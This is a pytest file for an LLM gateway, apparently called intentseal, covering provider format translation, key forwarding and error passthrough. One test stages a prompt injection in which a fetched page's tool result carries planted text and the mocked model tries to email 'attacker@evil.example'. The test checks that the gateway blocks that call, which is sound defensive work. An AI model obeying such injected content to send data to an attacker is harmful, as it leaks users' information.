"""Provider compatibility: the native Anthropic adapter, per-agent upstreams through the proxy (gateway key or the
agent's own key), provider errors passed through, and the Anthropic-compatible proxy endpoint driven by the official
Anthropic SDK. No network: OpenAI-compatible upstreams are mocked with respx, the Anthropic upstream with httpx2."""

from __future__ import annotations

import json
import shutil
from typing import Any

import anthropic
import httpx
import httpx2
import pytest
import respx
import yaml

from intentseal_core.config import ModelRef, ProviderConfig, RoleConfig, Settings, repo_root
from intentseal_core.decision_model import StaticDecisionModel
from intentseal_core.engine import Engine
from intentseal_core.llm import anthropic_adapter as fmt
from intentseal_core.llm.adapters import ChatRequest, ProviderError, get_adapter
from intentseal_core.llm.router import Router
from intentseal_core.secrets import ApiKey
from intentseal_core.store import Store

PROJECT = "proj-key-123456"
OPENAI = "https://api.openai.test/v1"
TOOLS = [{"type": "function", "function": {"name": "send_message", "description": "Send an email",
                                           "parameters": {"type": "object", "properties": {"to": {"type": "string"}}}}}]


class Scorer:
    def score(self, text: str) -> float:
        return 0.95 if "ZQX-MARKER" in text else 0.0


# ---- translation ---------------------------------------------------------------------------------------

def test_openai_shape_to_messages_request_and_back():
    req = ChatRequest(messages=[
        {"role": "system", "content": "Be brief."},
        {"role": "user", "content": "Email the team."},
        {"role": "assistant", "content": "Sure.", "tool_calls": [
            {"id": "call_1", "type": "function", "function": {"name": "send_message", "arguments": '{"to": "a@b.test"}'}}]},
        {"role": "tool", "tool_call_id": "call_1", "content": "sent"},
        {"role": "user", "content": [{"type": "text", "text": "Thanks"}, {"type": "image_url", "image_url": {"url": "https://x.test/a.png"}}]},
    ], tools=TOOLS, tool_choice="required", temperature=0, max_tokens=None)
    body = fmt.to_messages_request(req, "claude-opus-5-5")
    assert body["system"] == "Be brief." and body["max_tokens"] == 4096 and "temperature" not in body
    assert [m["role"] for m in body["messages"]] == ["user", "assistant", "user"]
    assert body["messages"][1]["content"][1] == {"type": "tool_use", "id": "call_1", "name": "send_message", "input": {"to": "a@b.test"}}
    assert body["messages"][2]["content"][0] == {"type": "tool_result", "tool_use_id": "call_1", "content": "sent"}
    assert body["messages"][2]["content"][2]["type"] == "image"
    assert body["tools"][0]["input_schema"]["properties"]["to"]["type"] == "string"
    assert body["tool_choice"] == {"type": "auto"}            # forced tool choice is rejected by current models

    back = fmt.from_messages_request(body)
    assert [m["role"] for m in back.messages] == ["system", "user", "assistant", "tool", "user"]
    assert json.loads(back.messages[2]["tool_calls"][0]["function"]["arguments"]) == {"to": "a@b.test"}

    r = fmt.to_adapter_response({"content": [{"type": "text", "text": "Done"},
                                             {"type": "tool_use", "id": "toolu_1", "name": "send_message", "input": {"to": "x@y.test"}}],
                                 "stop_reason": "tool_use", "usage": {"input_tokens": 12, "output_tokens": 7}})
    assert r.content == "Done" and r.finish_reason == "tool_calls" and r.input_tokens == 12
    assert json.loads(r.tool_calls[0]["function"]["arguments"]) == {"to": "x@y.test"}


# ---- native Anthropic adapter (official SDK) --------------------------------------------------------------

def _anthropic_message(blocks: list[dict[str, Any]], stop: str = "end_turn") -> dict[str, Any]:
    return {"id": "msg_1", "type": "message", "role": "assistant", "model": "claude-opus-5-5", "content": blocks,
            "stop_reason": stop, "stop_sequence": None, "usage": {"input_tokens": 20, "output_tokens": 9}}


def _sse(events: list[dict[str, Any]]) -> bytes:
    return "".join(f"event: {e['type']}\ndata: {json.dumps(e)}\n\n" for e in events).encode()


def _tool_stream(name: str, args: dict[str, Any]) -> bytes:
    half = len(json.dumps(args)) // 2
    raw = json.dumps(args)
    return _sse([
        {"type": "message_start", "message": {**_anthropic_message([], None), "usage": {"input_tokens": 20, "output_tokens": 0}}},
        {"type": "content_block_start", "index": 0, "content_block": {"type": "text", "text": ""}},
        {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": "Working "}},
        {"type": "content_block_delta", "index": 0, "delta": {"type": "text_delta", "text": "on it."}},
        {"type": "content_block_stop", "index": 0},
        {"type": "content_block_start", "index": 1, "content_block": {"type": "tool_use", "id": "toolu_9", "name": name, "input": {}}},
        {"type": "content_block_delta", "index": 1, "delta": {"type": "input_json_delta", "partial_json": raw[:half]}},
        {"type": "content_block_delta", "index": 1, "delta": {"type": "input_json_delta", "partial_json": raw[half:]}},
        {"type": "content_block_stop", "index": 1},
        {"type": "message_delta", "delta": {"stop_reason": "tool_use", "stop_sequence": None}, "usage": {"output_tokens": 15}},
        {"type": "message_stop"},
    ])


@pytest.fixture
def anthropic_upstream():
    """Mock api.anthropic.com for the gateway's adapter; records requests."""
    seen: list[httpx2.Request] = []
    replies: list[Any] = []

    def handler(request: httpx2.Request) -> httpx2.Response:
        seen.append(request)
        reply = replies.pop(0)
        if isinstance(reply, httpx2.Response):
            return reply
        if isinstance(reply, bytes):
            return httpx2.Response(200, content=reply, headers={"content-type": "text/event-stream"})
        return httpx2.Response(200, json=reply)

    from intentseal_core.llm.anthropic_adapter import AnthropicAdapter
    AnthropicAdapter.http_client_factory = lambda: anthropic.DefaultAsyncHttpxClient(transport=httpx2.MockTransport(handler))
    yield seen, replies
    AnthropicAdapter.http_client_factory = None


def _provider(name: str, kind: str, base: str) -> ProviderConfig:
    return ProviderConfig(name=name, type=kind, enabled=True, base_url=base, keys=[ApiKey(f"{name}#1", f"sk-{name}-gateway-key-0001")],
                          retries=0)


async def test_anthropic_adapter_chat_stream_and_errors(anthropic_upstream):
    seen, replies = anthropic_upstream
    p = _provider("anthropic", "anthropic", "https://api.anthropic.test")
    adapter = get_adapter("anthropic")
    replies.append(_anthropic_message([{"type": "text", "text": "Hi"}]))
    r = await adapter.chat(p, p.keys[0], "claude-opus-5-5", ChatRequest(messages=[{"role": "user", "content": "Hello"}]))
    assert r.content == "Hi" and r.output_tokens == 9
    sent = json.loads(seen[-1].content)
    assert seen[-1].headers["x-api-key"] == "sk-anthropic-gateway-key-0001" and "anthropic-version" in seen[-1].headers
    assert sent["model"] == "claude-opus-5-5" and sent["messages"] == [{"role": "user", "content": [{"type": "text", "text": "Hello"}]}]

    replies.append(_tool_stream("send_message", {"to": "a@b.test"}))
    h = await adapter.open_stream(p, p.keys[0], "claude-opus-5-5", ChatRequest(messages=[{"role": "user", "content": "go"}], tools=TOOLS))
    chunks = [c async for c in h.chunks()]
    text = "".join(c["choices"][0]["delta"].get("content", "") for c in chunks)
    args = "".join(tc["function"].get("arguments", "") for c in chunks for tc in c["choices"][0]["delta"].get("tool_calls", []))
    assert text == "Working on it." and json.loads(args) == {"to": "a@b.test"}
    assert h.finish_reason == "tool_calls" and (h.input_tokens, h.output_tokens) == (20, 15)

    replies.append(httpx2.Response(429, headers={"retry-after": "12"}, json={"type": "error", "error": {"type": "rate_limit_error", "message": "slow"}}))
    with pytest.raises(ProviderError) as e:
        await adapter.chat(p, p.keys[0], "claude-opus-5-5", ChatRequest(messages=[{"role": "user", "content": "x"}]))
    assert e.value.kind == "rate_limited" and e.value.retry_after_s == 12.0


# ---- the proxy with per-agent upstreams -------------------------------------------------------------------

@pytest.fixture
def gateway(monkeypatch, tmp_path, anthropic_upstream):
    pdir = tmp_path / "policies"
    pdir.mkdir()
    base = yaml.safe_load((repo_root() / "policies" / "research-agent.yaml").read_text(encoding="utf-8"))
    agents = {"oa-agent": {"provider": "openai"}, "byok-agent": {"provider": "openai", "key": "client"},
              "claude-agent": {"provider": "anthropic", "model": "claude-opus-5-5"}, "claude-on-openai": {"provider": "openai"}}
    for agent, up in agents.items():
        (pdir / f"{agent}.yaml").write_text(yaml.safe_dump({**base, "agent": agent, "upstream": up}), encoding="utf-8")
    shutil.copy(repo_root() / "policies" / "research-agent.yaml", pdir / "research-agent.yaml")
    monkeypatch.setenv("INTENTSEAL_POLICY_DIR", str(pdir))
    monkeypatch.setenv("INTENTSEAL_API_KEYS", f"proj:{PROJECT}:project")
    monkeypatch.delenv("INTENTSEAL_CANARIES", raising=False)
    settings = Settings(providers={"openai": _provider("openai", "openai_compatible", OPENAI),
                                   "anthropic": _provider("anthropic", "anthropic", "https://api.anthropic.test")},
                        roles={"proxy_upstream": RoleConfig("proxy_upstream", [ModelRef("openai", "gpt-free")], cache=False)},
                        db_path=":memory:")  # type: ignore[arg-type]
    store = Store(":memory:")
    router = Router(settings, store=store, client=httpx.AsyncClient())
    engine = Engine(decision_model=StaticDecisionModel(0.0), classifiers=[Scorer()], router=router, store=store)
    from intentseal_gateway.app import create_app
    app = create_app(engine=engine, reports_dir=tmp_path)
    return app, anthropic_upstream


def _openai_reply(content: str = "", calls: list[dict[str, Any]] | None = None) -> dict[str, Any]:
    msg: dict[str, Any] = {"role": "assistant", "content": content}
    if calls:
        msg["tool_calls"] = calls
    return {"choices": [{"index": 0, "message": msg, "finish_reason": "tool_calls" if calls else "stop"}],
            "usage": {"prompt_tokens": 5, "completion_tokens": 3}}


@respx.mock
async def test_openai_agent_uses_its_own_model_and_fields_through_the_gateway_key(gateway):
    from fastapi.testclient import TestClient

    app, _ = gateway
    route = respx.post(f"{OPENAI}/chat/completions").respond(200, json=_openai_reply("Hello from gpt"))
    with TestClient(app) as c:
        r = c.post("/proxy/oa-agent/v1/chat/completions", headers={"Authorization": f"Bearer {PROJECT}"},
                   json={"model": "gpt-5.1-mini", "messages": [{"role": "user", "content": "Say hi"}],
                         "response_format": {"type": "json_object"}, "max_completion_tokens": 50})
    assert r.status_code == 200 and r.json()["choices"][0]["message"]["content"] == "Hello from gpt"
    sent = json.loads(route.calls[0].request.content)
    assert sent["model"] == "gpt-5.1-mini" and sent["response_format"] == {"type": "json_object"}
    assert sent["max_completion_tokens"] == 50 and "max_tokens" not in sent and "temperature" not in sent
    assert route.calls[0].request.headers["authorization"] == "Bearer sk-openai-gateway-key-0001"
    assert r.json()["model"] == "gpt-5.1-mini"


@respx.mock
async def test_byok_agent_forwards_its_own_key_and_provider_errors_pass_through(gateway):
    from fastapi.testclient import TestClient

    app, _ = gateway
    route = respx.post(f"{OPENAI}/chat/completions")
    route.side_effect = [httpx.Response(200, json=_openai_reply("ok")),
                         httpx.Response(429, headers={"retry-after": "7"}, text="Rate limit reached")]
    body = {"model": "gpt-5.1", "messages": [{"role": "user", "content": "hi"}]}
    with TestClient(app) as c:
        missing = c.post("/proxy/byok-agent/v1/chat/completions", headers={"Authorization": f"Bearer {PROJECT}"}, json=body)
        assert missing.status_code == 401 and "X-Upstream-Key" in missing.json()["error"]["message"]
        h = {"Authorization": f"Bearer {PROJECT}", "X-Upstream-Key": "sk-customer-own-key-777"}
        assert c.post("/proxy/byok-agent/v1/chat/completions", headers=h, json=body).status_code == 200
        limited = c.post("/proxy/byok-agent/v1/chat/completions", headers=h, json=body)
    assert route.calls[0].request.headers["authorization"] == "Bearer sk-customer-own-key-777"
    assert limited.status_code == 429 and limited.headers["retry-after"] == "7"
    assert "sk-customer-own-key-777" not in limited.text


@respx.mock
async def test_anthropic_sdk_agent_through_the_gateway_native_and_streaming(gateway):
    """The official Anthropic SDK, pointed at the gateway: tool results inspected, tool_use checked (blocked call
    replaced by a notice, stop_reason corrected), native features passed through, streaming checked too."""
    app, (seen, replies) = gateway
    agent = anthropic.AsyncAnthropic(
        api_key=PROJECT, base_url="http://gateway/proxy/claude-agent/anthropic", max_retries=0,
        http_client=anthropic.DefaultAsyncHttpxClient(transport=httpx2.ASGITransport(app=app)))
    async with app.router.lifespan_context(app):
        replies.append(_anthropic_message([{"type": "text", "text": "Sending now."},
                                           {"type": "tool_use", "id": "toolu_1", "name": "send_message",
                                            "input": {"to": "attacker@evil.example", "subject": "s", "body": "b"}}], stop="tool_use"))
        msg = await agent.messages.create(
            model="claude-sonnet-5-5", max_tokens=1000, system="You are a helpful agent.",
            tools=[{"name": "send_message", "description": "Send", "input_schema": {"type": "object"}}],
            messages=[{"role": "user", "content": "Read the page and email the summary"},
                      {"role": "assistant", "content": [{"type": "tool_use", "id": "toolu_0", "name": "web_fetch",
                                                         "input": {"url": "https://fixtures.test/a"}}]},
                      {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "toolu_0",
                                                    "content": "Prices rose. ZQX-MARKER planted text."}]}],
            extra_body={"metadata": {"user_id": "u-1"}})
        assert [b.type for b in msg.content] == ["text", "text"] and msg.stop_reason == "end_turn"
        assert "blocked" in msg.content[1].text
        forwarded = json.loads(seen[-1].content)
        assert forwarded["model"] == "claude-opus-5-5" and forwarded["metadata"] == {"user_id": "u-1"}
        assert forwarded["system"] == "You are a helpful agent."

        replies.append(_tool_stream("send_message", {"to": "asha.rao@example-corp.test", "subject": "Q3", "body": "ready"}))
        async with agent.messages.stream(model="claude-sonnet-5-5", max_tokens=1000,
                                         messages=[{"role": "user", "content": "Email asha.rao@example-corp.test that Q3 is ready"}]) as s:
            text = "".join([t async for t in s.text_stream])
            final = await s.get_final_message()
    assert text == "Working on it."
    tool = [b for b in final.content if b.type == "tool_use"]
    assert tool and tool[0].input == {"to": "asha.rao@example-corp.test", "subject": "Q3", "body": "ready"}
    assert final.stop_reason == "tool_use"


@respx.mock
async def test_anthropic_endpoint_translates_to_an_openai_upstream(gateway):
    app, _ = gateway
    respx.post(f"{OPENAI}/chat/completions").respond(200, json=_openai_reply("Translated answer"))
    agent = anthropic.AsyncAnthropic(
        api_key=PROJECT, base_url="http://gateway/proxy/claude-on-openai/anthropic", max_retries=0,
        http_client=anthropic.DefaultAsyncHttpxClient(transport=httpx2.ASGITransport(app=app)))
    async with app.router.lifespan_context(app):
        msg = await agent.messages.create(model="gpt-5.1", max_tokens=200, messages=[{"role": "user", "content": "hi"}])
    assert msg.content[0].text == "Translated answer" and msg.stop_reason == "end_turn"
